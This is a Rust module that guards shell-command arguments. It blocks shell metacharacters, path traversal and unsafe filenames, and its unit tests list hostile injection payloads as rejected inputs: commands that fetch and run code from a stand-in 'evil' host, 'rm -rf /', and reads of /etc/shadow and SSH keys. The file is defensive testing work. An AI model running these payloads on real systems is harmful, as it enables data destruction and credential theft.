use std::collections::HashSet;
use std::path::PathBuf;
use std::sync::LazyLock;

/// Characters that must never appear in a string handled by `SafeCommand`.
///
/// `SafeCommand` does not spawn a shell, but its arguments are sometimes
/// copied into shell command lines by callers. #2621 requires that no single
/// argument can change the structure of such a command line, so the set
/// covers separators, expansions, redirection, grouping, globbing, quoting,
/// comments and history expansion in addition to control characters.
pub(crate) static FORBIDDEN_SHELL_CHARS: LazyLock<HashSet<char>> = LazyLock::new(|| {
    HashSet::from([
        // Command separators, pipelines and job control.
        ';', '&', '|', // Parameter, command and arithmetic expansion.
        '$', '`', // Redirection and here-documents.
        '<', '>', // Grouping, globbing, brace expansion, tilde and history expansion.
        '(', ')', '{', '}', '*', '?', '[', ']', '~', '!', // Quoting and comments.
        '\'', '"', '#', // Line/record separators (also caught by `char::is_control`).
        '\n', '\r', '\0',
    ])
});

/// Return the first shell metacharacter or control character in `value`.
///
/// `allow_url_separators` preserves the long-standing exception for `&`, `?`
/// and `=` in URL query strings.
pub(crate) fn find_forbidden_shell_char(value: &str, allow_url_separators: bool) -> Option<char> {
    value.chars().find(|c| {
        if allow_url_separators && matches!(c, '&' | '?' | '=') {
            return false;
        }
        c.is_control() || FORBIDDEN_SHELL_CHARS.contains(c)
    })
}

/// Like [`find_forbidden_shell_char`], but tolerates the `&&` operator used by
/// server-constructed installer scripts (`cd <dir> && ./install.sh`). A lone
/// `&` (background job) and `&&&` (pair plus background job) are still refused.
pub(crate) fn find_forbidden_script_char(value: &str) -> Option<char> {
    let mut chars = value.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '&' && chars.peek() == Some(&'&') {
            chars.next();
            continue;
        }
        if c.is_control() || FORBIDDEN_SHELL_CHARS.contains(&c) {
            return Some(c);
        }
    }
    None
}

/// On Windows, normalise a program name for allowlist lookup: extract the
/// file-name component, lower-case it, and strip a single trailing `.exe`.
/// On non-Windows this just extracts the file-name component unchanged.
pub fn normalise_command_name(command: &str) -> String {
    let file_name = std::path::Path::new(command)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or(command);

    if cfg!(windows) {
        let lower = file_name.to_ascii_lowercase();
        lower.strip_suffix(".exe").unwrap_or(&lower).to_string()
    } else {
        file_name.to_string()
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CommandGuardError {
    CommandNotAllowed(String),
    InvalidArgument(String),
    PathTraversal(String),
    ExecutionFailed(String),
    ShellInjectionAttempt(String),
}

impl std::fmt::Display for CommandGuardError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::CommandNotAllowed(cmd) => write!(f, "Command not in allowlist: {cmd}"),
            Self::InvalidArgument(arg) => write!(f, "Invalid argument: {arg}"),
            Self::PathTraversal(path) => write!(f, "Path traversal detected: {path}"),
            Self::ExecutionFailed(msg) => write!(f, "Command execution failed: {msg}"),
            Self::ShellInjectionAttempt(input) => {
                write!(f, "Shell injection attempt detected: {input}")
            }
        }
    }
}

impl From<CommandGuardError> for String {
    fn from(val: CommandGuardError) -> Self {
        val.to_string()
    }
}

impl std::error::Error for CommandGuardError {}

pub fn validate_argument(arg: &str) -> Result<(), CommandGuardError> {
    if arg.is_empty() {
        return Err(CommandGuardError::InvalidArgument(
            "Empty argument".to_string(),
        ));
    }

    if arg.len() > 4096 {
        return Err(CommandGuardError::InvalidArgument(
            "Argument too long".to_string(),
        ));
    }

    let is_url = arg.starts_with("http://") || arg.starts_with("https://");

    if let Some(c) = find_forbidden_shell_char(arg, is_url) {
        return Err(CommandGuardError::ShellInjectionAttempt(format!(
            "Forbidden character '{}' in argument",
            c.escape_default()
        )));
    }

    let dangerous_patterns = ["$(", "`", "&&", "||", ">>", "<<", "..", "//", "\\\\"];

    for pattern in dangerous_patterns {
        if arg.contains(pattern) {
            if is_url && pattern == "//" {
                continue;
            }
            return Err(CommandGuardError::ShellInjectionAttempt(format!(
                "Dangerous pattern '{}' detected",
                pattern
            )));
        }
    }

    Ok(())
}

fn normalize_path_for_compare(p: &std::path::Path) -> String {
    let s = p.to_string_lossy();
    let s = if let Some(stripped) = s.strip_prefix("\\\\?\\") {
        stripped.to_string()
    } else {
        s.to_string()
    };
    let s = if s.starts_with("Z:\\")
        || s.starts_with("Z:/")
        || s.starts_with("z:\\")
        || s.starts_with("z:/")
    {
        s.replacen("Z:\\", "/", 1)
            .replacen("Z:/", "/", 1)
            .replacen("z:\\", "/", 1)
            .replacen("z:/", "/", 1)
    } else {
        s
    };
    s.replace('\\', "/")
}

pub fn validate_path(
    path: &std::path::Path,
    allowed_roots: &[PathBuf],
) -> Result<PathBuf, CommandGuardError> {
    let canonical = match path.canonicalize() {
        Ok(c) => c,
        Err(_) => match path.parent() {
            Some(parent) => match parent.canonicalize() {
                Ok(p) => p.join(path.file_name().unwrap_or_default()),
                Err(_) => path.to_path_buf(),
            },
            None => path.to_path_buf(),
        },
    };

    let path_str = canonical.to_string_lossy();
    if path_str.contains("..") {
        return Err(CommandGuardError::PathTraversal(format!(
            "Path contains traversal: {}",
            path.display()
        )));
    }

    let is_allowed = allowed_roots.iter().any(|root| {
        if canonical.starts_with(root) {
            return true;
        }
        let np = normalize_path_for_compare(&canonical);
        let nr = normalize_path_for_compare(root);
        np.starts_with(&nr)
    });

    if !is_allowed {
        return Err(CommandGuardError::PathTraversal(format!(
            "Path outside allowed directories: {}",
            path.display()
        )));
    }

    Ok(canonical)
}

pub fn sanitize_filename(filename: &str) -> String {
    filename
        .chars()
        .filter(|c| c.is_alphanumeric() || *c == '.' || *c == '-' || *c == '_')
        .collect::<String>()
        .trim_start_matches('.')
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_argument_valid() {
        assert!(validate_argument("hello").is_ok());
        assert!(validate_argument("-f").is_ok());
        assert!(validate_argument("--format=csv").is_ok());
        assert!(validate_argument("/path/to/file.txt").is_ok());
    }

    #[test]
    fn test_validate_argument_invalid() {
        assert!(validate_argument("hello; rm -rf /").is_err());
        assert!(validate_argument("$(whoami)").is_err());
        assert!(validate_argument("file | cat").is_err());
        assert!(validate_argument("test && echo").is_err());
        assert!(validate_argument("`id`").is_err());
        assert!(validate_argument("").is_err());
    }

    /// #2621 — every metacharacter must be rejected in isolation and when
    /// embedded in an otherwise harmless argument.
    #[test]
    fn hostile_metacharacter_corpus_is_rejected() {
        let corpus = [
            "a;b", "a&b", "a|b", "a$b", "a`b", "a<b", "a>b", "a(b", "a)b", "a{b", "a}b", "a*b",
            "a?b", "a[b", "a]b", "a~b", "a!b", "a#b", "a'b", "a\"b", "a\nb", "a\rb", "a\0b",
            "a\tb", "a\u{1b}b",
        ];
        for hostile in corpus {
            assert!(
                validate_argument(hostile).is_err(),
                "must refuse metacharacter in {hostile:?}"
            );
        }
    }

    /// Realistic injection payloads that previously slipped through because
    /// the filter only knew about `$()`, backticks and `..`. #2621
    #[test]
    fn realistic_injection_payloads_are_rejected() {
        for payload in [
            "report.pdf; curl http://evil/x | sh",
            "$(curl http://evil/x)",
            "`id`",
            "${IFS}cat${IFS}/etc/passwd",
            "a && rm -rf /",
            "a || rm -rf /",
            "a > /etc/cron.d/pwn",
            "a < /etc/shadow",
            "a\nbad-command",
            "a\rbad-command",
            "a\0truncated",
            "* /etc/shadow",
            "? /etc/passwd",
            "~/.ssh/id_rsa",
            "# comment\nrm -rf /",
            "!history",
            "name' OR '1'='1",
            "say \"hello\"",
            "file(name).txt",
            "{a,b}/secret",
            "[abc]/secret",
            "..%2f..%2fetc",
        ] {
            assert!(
                validate_argument(payload).is_err(),
                "must refuse injection payload {payload:?}"
            );
        }
    }

    /// All C0/C1 controls are refused, not only the few we can name. #2621
    #[test]
    fn all_control_characters_are_rejected() {
        for code in 0u32..=0x1f {
            if let Some(c) = char::from_u32(code) {
                assert!(
                    validate_argument(&format!("a{c}b")).is_err(),
                    "control U+{code:04X} must be refused"
                );
            }
        }
        for c in ['\u{7f}', '\u{80}', '\u{9f}'] {
            assert!(
                validate_argument(&format!("a{c}b")).is_err(),
                "control {c:?} must be refused"
            );
        }
    }

    /// The script path deliberately tolerates `&&` for server-constructed
    /// installer scripts, but must not tolerate a bare `&` or `&&&`. #2621
    #[test]
    fn script_filter_allows_double_ampersand_only() {
        assert!(find_forbidden_script_char("cd /tmp/x && ./install.sh").is_none());
        assert_eq!(find_forbidden_script_char("echo a &"), Some('&'));
        assert_eq!(find_forbidden_script_char("echo a &&& b"), Some('&'));
        assert_eq!(find_forbidden_script_char("echo a; b"), Some(';'));
    }

    #[test]
    fn test_sanitize_filename() {
        assert_eq!(sanitize_filename("test.pdf"), "test.pdf");
        assert_eq!(sanitize_filename("my-file_v1.txt"), "my-file_v1.txt");
        assert_eq!(sanitize_filename("../../../etc/passwd"), "etcpasswd");
        assert_eq!(sanitize_filename(".hidden"), "hidden");
        assert_eq!(sanitize_filename("file;rm -rf.txt"), "filerm-rf.txt");
    }

    #[test]
    fn test_path_traversal_detection() {
        let result = validate_argument("../../../etc/passwd");
        assert!(result.is_err());
    }

    #[test]
    fn test_command_guard_error_display() {
        let err = CommandGuardError::CommandNotAllowed("bash".to_string());
        assert!(err.to_string().contains("bash"));

        let err2 = CommandGuardError::ShellInjectionAttempt("$(id)".to_string());
        assert!(err2.to_string().contains("injection"));
    }
}
